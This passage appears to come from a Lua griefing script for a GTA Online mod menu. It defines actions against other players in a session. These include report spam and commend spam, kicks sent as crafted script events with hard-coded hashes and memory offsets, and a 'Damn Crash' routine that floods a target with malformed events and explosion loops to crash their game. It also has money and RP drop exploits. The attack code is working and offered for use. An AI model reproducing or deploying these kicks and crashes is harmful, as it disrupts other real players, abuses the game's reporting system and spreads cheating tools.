            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)

            util.yield(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

            --util.toast(os.date("%H:%M:%S") .. " DONE", TOAST_ABOVE_MAP)

        end
	end)

	menu.action(griefing,"Deliver Player to you", {"deliver"}, "Kidnaps the target and brings them to your current location", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}


            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
			local PlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
			local PedCoords = ENTITY.GET_ENTITY_COORDS(PlayerPed)
            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            --TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)
			TASK.TASK_VEHICLE_DRIVE_TO_COORD(ped_to_drive, table_kidnap[veh_to_attach], PedCoords.x, PedCoords.y, PedCoords.z, 30, 1, hash, 4, 5, 0)

            util.yield(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

            --util.toast(os.date("%H:%M:%S") .. " DONE", TOAST_ABOVE_MAP)

        end
	end)

	menu.action(griefing,"Ban Voice Chat", {}, "May lag your game when in progress", function(on)
		if pid ~= players.user() then
			for i = 1, 30 do
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
				util.yield()
			end
		end
	end)

	menu.toggle(griefing,"Report Spam", {}, "May lag your game when in progress", function(on)
		spam = on
		while spam do
			if pid ~= players.user() then
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
			end
			util.yield()
		end
	end)

	menu.toggle(griefing,"Commend Spam", {}, "May lag your game when in progress", function(on)
		spam = on
		while spam do
			if pid ~= players.user() then
				menu.trigger_commands("commendfriendly " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("commendhelpful " .. PLAYER.GET_PLAYER_NAME(pid))
			end
			util.yield()
		end
	end)

-----------------------------------------------------------------------------------------------------------------------------------------

	crash = menu.list(menu.player_root(pid), "Crashes", {}, "Currupt Crash", function(); end)
	kick = menu.list(menu.player_root(pid), "Kicks", {}, "Network Bail", function(); end)


        menu.action(kick, "Blast Kick", {"blast"}, "Blocks the player join reaction then uses breakup kick", function()
        notification("Blast kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("historyblock " .. players.get_name(pid))
            menu.trigger_commands("breakup" .. players.get_name(pid))
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

        menu.action(kick, "Boop Kick", {"boop"}, "Kicks the player using a SE kick like breakup kick but uses 3 types of SE kicks then 3 more new ones if they don't work", function()
            util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
            util.trigger_script_event(1 << pid, {0x6A16C7F, pid, memory.script_global(0x2908D3 + 1 + (pid * 0x1C5) + 0x13E + 0x7)})
            util.trigger_script_event(1 << pid, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
            menu.trigger_commands("breakup" .. players.get_name(pid))
            util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
            util.trigger_script_event(1 << pid, {0x6A16C7F, pid, memory.script_global(0x2908D3 + 1 + (pid * 0x1C5) + 0x13E + 0x7)})
            util.trigger_script_event(1 << pid, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(kick, "Desync Kick", {"desynckick"}, "Desyncs the player from the session", function()
    notification("Desycn kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        util.trigger_script_event(1 << pid, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(kick, "Storymode Kick", {"storymode"}, "Sends them to storymode", function()
    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        util.trigger_script_event(1 << pid, {111242367, pid, memory.script_global(2689235 + 1 + (pid * 453) + 318 + 7)})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(kick, "Invalid Figure Kick", {"figurekick"}, "Drops invalid figures on player causing them to be kicked, also gives them rp and a lot of notifications with errors.", function(on_toggle)
        util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
    end)

    menu.action(kick, "SE kick v1", {"kickv1"}, "", function()
    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        util.trigger_script_event(1 << pid, {111242367, pid, -210634234})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(kick, "SE kick v2", {"kickv2"}, "", function()
    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        util.trigger_script_event(1 << pid, {421832664, pid, 0, 1951261, 829})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(kick, "SE kick v3", {"kickv3"}, "", function()
    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        util.trigger_script_event(1 << pid, {0xB9BA4D30, PlayerID, 0x4, -1, 1, 1, 1})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(kick, "SE kick v4", {"kickv4"}, "", function()
    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        util.trigger_script_event(1 << pid, {603406648, 0, 380565701, -1443464333, 1, 115, 954851592, -768074745, 1278027916})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(kick, "SE kick v5", {"kickv5"}, "", function()
    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        util.trigger_script_event(1 << pid, {603406648, 0, 1279476345, 655005918, 1, 115, 1997628673, 6299376, -302416007})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.divider(kick, "Stand Kicks")

    	menu.action(kick, "Smart", {"kick"}, "Removes the player by any means necessary.", function()
	menu.trigger_commands("kick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Breakup", {"breakup"}, "A discrete kick that won't tell the target who did it.", function()
	menu.trigger_commands("breakup"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Confusion", {"confusion"}, "Can't be blocked without consequences, but the target might karma you for using it.", function()
	menu.trigger_commands("confusion"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Love Letter", {"loveletterkick"}, "A discrete kick that won't tell the target who did it. Unblockable when you are the host.", function()
	menu.trigger_commands("loveletterkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Orgasm", {"orgasmkick"}, "Blocked by popular menus.", function()
	menu.trigger_commands("orgasmkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Blacklist", {"blacklist"}, "Adds the player to the blacklist like they were vote kicked, but kicks them like a desync. Only available when you are the host.", function()
	menu.trigger_commands("blacklist"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Host", {"hostkick"}, "Kicks the player using the vote kick mechanism. Unblockable when you are the host, but you might be karma'd for it.", function()
	menu.trigger_commands("hostkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Non-Host", {"nonhostkick"}, "Kicks the player using script events. Blocked by most menus.", function()
	menu.trigger_commands("nonhostkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Invalid Pickup", {"pickupkick"}, "Block by most menus.", function()
	menu.trigger_commands("pickupkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)


	local WeakCrash = {
		"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
	}

                       menu.toggle_loop(griefing, "SmS Spam", {}, "Might Work On Pussy's Fam", function(on_toggle)
		menu.trigger_commands("smstext" .. PLAYER.GET_PLAYER_NAME(pid).. " " .. WeakCrash[math.random(1, #WeakCrash)])
		util.yield()
		menu.trigger_commands("smssend" .. PLAYER.GET_PLAYER_NAME(pid))
	end)
	
                       menu.toggle(griefing, "Notify Spam", {}, "", function(on_toggle)
	if on then
		menu.trigger_commands("notifyspam" .. PLAYER.GET_PLAYER_NAME(pid).. " " .. WeakCrash[math.random(1, #WeakCrash)])
	else
		menu.trigger_commands("notifyspam" .. PLAYER.GET_PLAYER_NAME(pid))
		end
	end)
        

	passivemode = menu.list(griefing, "Passive Mode", {}, "", function(); end)

	menu.action(passivemode,"Block", {}, "", function()
		if players.exists(pid) then
			send_script_event(1114091621, pid, {pid, 1})
			send_script_event(1859990871, pid, {pid, 1})
		end
	end)

	menu.action(passivemode,"Unblock", {}, "", function()
		if players.exists(pid) then
			send_script_event(1114091621, pid, {pid, 0})
			send_script_event(2033772643, pid, {pid, 0})
		end
	end)

	menu.action(griefing, "Spectate", {"spec"}, "", function()
    	notification("Spectating " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid))
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
		end
	end)


    		local frienm = menu.list(menu.player_root(pid), 'Friendly', {}, '')

	menu.action(frienm, "Protect Player", {"max"}, "Turns on auto heal, never wanted, gives all weapons, ammo and parachute all at once", function ()
    	notification("Protecting " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		menu.trigger_commands("bail".. players.get_name(pid))
        		menu.trigger_commands("autoheal".. players.get_name(pid))
        		menu.trigger_commands("arm".. players.get_name(pid))
        		menu.trigger_commands("ammo".. players.get_name(pid))
        		menu.trigger_commands("paragive".. players.get_name(pid))
	notification("PROTECTED!!! GANG SHIT!!!", colors.red)
    	end, nil, nil, COMMANDPERM_FRIENDLY)


            local player_torque = 1000
            menu.slider(frienm, 'Set Torque', {'torque'}, 'Modifies the speed of their vehicle.', -1000000, 1000000, player_torque, 1000, function(value)
                player_torque = value
                util.create_tick_handler(function()
                    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
                        local playerVehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(playerVehicle)
                        VEHICLE.SET_VEHICLE_CHEAT_POWER_INCREASE(playerVehicle, player_torque/1000)
                    end
                    return (player_torque != 1000)
                end, nil, nil, COMMANDPERM_FRIENDLY)
            end)


	menu.action(frienm,"Boost", {"boost"}, "Sets max speed of vehicle to 100 better for cars",function()
       	notification("100x vehicle speed boost for  " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 100)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm,"Currupt boost", {"Currupt boost"}, "Sets max speed of vehicle to 9999999 better for bikes",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 9999999) 
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm,"Reset Speed", {"resetacc"}, "Resets max speed of vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 1) 
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm,"Repair", {"repair"}, "Repairs player's vehicle. Note: It will lag them a bit if you hold the toggle on", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_FIXED(vehicle)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm,"GodVeh On", {"invon"}, "Gives invincibility to player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm,"GodVeh Off", {"invoff"}, "Removes invincibility from player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then	
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

    local friendly = menu.list(frienm, "Jinx Drops", {}, "")


    menu.action(friendly, "Rank Them Up", {"rankplayer"}, "Gives them ~175k RP. Can boost a lvl 1 ~25 levels.", function()
        util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x5, 0, 1, 1, 1})
        for i = 0, 9 do
            util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x0, i, 1, 1, 1})
            util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x1, i, 1, 1, 1})
            util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x3, i, 1, 1, 1})
            util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0xA, i, 1, 1, 1})
        end
        for i = 0, 1 do
            util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x2, i, 1, 1, 1})
            util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x6, i, 1, 1, 1})
        end
        for i = 0, 19 do
            util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, i, 1, 1, 1})
        end
        for i = 0, 99 do
            util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x9, i, 1, 1, 1})
            util.yield()
        end
    end, nil, nil, COMMANDPERM_FRIENDLY)

    local halloween_loop = menu.list(friendly, "Halloween Collectible Loop", {}, "")
    local halloween_delay = 500
    menu.slider(halloween_loop, "Delay", {}, "", 0, 2500,1, 10, function(amount)
        halloween_delay = amount
    end)
    player_toggle_loop(halloween_loop, pid, "Enable Loop", {"halloweenloop"}, "Should give them quite a bit of money and some other stuff", function()
        util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x8, -1, 1, 1, 1})
        util.yield(halloween_delay)
    end)

    local rpwarning
     rpwarning = menu.action(friendly, "Collectible RP Loop", {}, "", function(click_type)
        menu.show_warning(rpwarning, click_type, "Warning: This will kick legit players and hasn't been fully tested yet. Proceed with caution.", function()
            local rp_loop = menu.list(friendly, "Collectible RP Loop", {}, "")
            menu.delete(rpwarning)

            menu.toggle_loop(rp_loop, "Enable RP Loop", {}, "Each collectible gives 1k RP", function()
                util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
                util.yield(rp_delay)
            end)
            menu.trigger_command(rp_loop)
        end)
    end)

    local drops = menu.list(frienm, "Currupt Drops", {}, "")

    menu.toggle_loop(drops, "Drop Cards", {}, "Players can only pickup 54 cards per session, Note this hasn't been tested for bans but it should be safe", function()
        local coords = players.get_position(pid)
        coords.z = coords.z + 1.5
        local card = MISC.GET_HASH_KEY("vw_prop_vw_lux_card_01a")
        STREAMING.REQUEST_MODEL(card)
        if STREAMING.HAS_MODEL_LOADED(card) == false then  
            STREAMING.REQUEST_MODEL(card)
        end
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, card, false, true)
    end)

	menu.action(drops, "Crazy Drops", {"crazydrop"}, "Turns on rp drops, ceopay, snacks and cash all 1 then changes to just ceo pay and cash 3600 after 5 seconds. Then gives them ~175k RP. Can boost a lvl 1 ~25 levels.", function()
		notification("Currupt Drop :)", colors.pink)
        		menu.trigger_commands("ceopay".. players.get_name(pid))
        		menu.trigger_commands("snack".. players.get_name(pid) .. " on")
		util.yield(600)
        		menu.trigger_commands("snack".. players.get_name(pid) .. " off")
		menu.trigger_commands("cash".. players.get_name(pid) .. " 1")
        		menu.trigger_commands("arm".. players.get_name(pid))
        		menu.trigger_commands("ammo".. players.get_name(pid))
        		menu.trigger_commands("paragive".. players.get_name(pid))
		util.yield(5000)
		menu.trigger_commands("cash".. players.get_name(pid) .. " 3600")
        		menu.trigger_commands("rp".. players.get_name(pid) .. " on")
		util.yield(10000)
        		menu.trigger_commands("rp".. players.get_name(pid) .. " off")
        		menu.trigger_commands("rankplayer".. players.get_name(pid))
        		menu.trigger_commands("halloweenloop".. players.get_name(pid) .. " on")
		util.yield(1000)
        		menu.trigger_commands("halloweenloop".. players.get_name(pid) .. " off")
    	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(drops, "Cash 3600 Timer", {"cashon"}, "Turns on ceopay and cash 3600.", function()
		notification("Currupt Drop On :)", colors.green)
        		menu.trigger_commands("ceopay".. players.get_name(pid))
		menu.trigger_commands("cash".. players.get_name(pid) .. " 3600")
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(drops, "Cash Off", {"cashoff"}, "Turns off ceopay and cash 0.", function()
		notification("Currupt Drop On :)", colors.green)
        		menu.trigger_commands("ceopay".. players.get_name(pid))
		menu.trigger_commands("cash".. players.get_name(pid) .. " 0")
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm, "Spectate", {"spec"}, "", function()
    	notification("Spectating " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid))
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
		end
	end)

	menu.action(menu.player_root(pid), "Spectate", {"spec"}, "", function()
    	notification("Spectating " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid))
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
		end
	end)


local function bitTest(addr, offset)
    return (memory.read_int(addr) & (1 << offset)) ~= 0
end

local include_friends = false
menu.toggle(crash, "Exclude friends", {}, "Save friends ass from being crashed if close (Turns off sync to friends using timeout).", function(on)
    include_friends = on
    for k, id in pairs(players.list(false, true, false)) do
        name = players.get_name(id)
        if include_friends then
            menu.trigger_commands("timeout"..name.." on")
        else
            menu.trigger_commands("timeout"..name.." off")
        end
    end
end, false)


    local damncrash = menu.list(crash, "Damn Crash", {}, "")

    	menu.action(damncrash, "Damn Crash", {"damncrash"}, "This one is bound to hurt.", function()
    	notification("Damn Crash Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-1529596656, pid, 795221, 59486,48512151,-9545440, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
	menu.trigger_commands("notifyspam" .. players.get_name(pid))
	menu.trigger_commands("ring" .. players.get_name(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
        	menu.trigger_commands("explodeloop" .. players.get_name(pid))
	menu.trigger_commands("explosiondelay".. players.get_name(pid) .. " 50")
	menu.trigger_commands("explosionshake".. players.get_name(pid) .. " 10")
        	menu.trigger_commands("ptfx" .. players.get_name(pid))
        	menu.trigger_commands("ptfxamount" .. players.get_name(pid) .. " 250")
        	menu.trigger_commands("ptfxsize" .. players.get_name(pid) .. " 10")
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        		util.yield(100)
        			util.trigger_script_event(1 << pid, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {962740265, 2000000, 2000000, 2000000, 2000000})
        			util.trigger_script_event(1 << pid, {1228916411, 1, 1245317585})
        			util.trigger_script_event(1 << pid, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
        			util.trigger_script_event(1 << pid, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
        			util.trigger_script_event(1 << pid, {-555356783, pid, 85952,99999,52682274855,526822745})
        			util.trigger_script_event(1 << pid, {526822748, pid, 78552,99999 ,7949161,789454312})
        			util.trigger_script_event(1 << pid, {-8965204809, pid, 795221,59486,48512151,-9545440})
        			util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    	notification("Doge that shit then! " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)


    	menu.toggle_loop(damncrash, "Damn Crash", {"toggledamn"}, "This one is bound to hurt.", function(on_toggle)
    	notification("Damn Crash Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
